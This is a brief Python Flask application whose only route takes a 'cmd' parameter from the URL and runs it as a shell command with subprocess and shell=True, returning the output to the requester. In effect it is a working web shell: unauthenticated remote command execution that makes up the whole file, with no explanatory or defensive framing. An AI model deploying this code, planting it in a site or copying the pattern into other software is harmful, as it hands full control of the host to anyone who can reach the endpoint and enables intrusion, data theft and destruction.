import subprocess
from flask import Flask, request

app = Flask(__name__)

def exec(command):
	return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/')
def index():
	cmd = request.args.get('cmd')
	return exec(cmd)
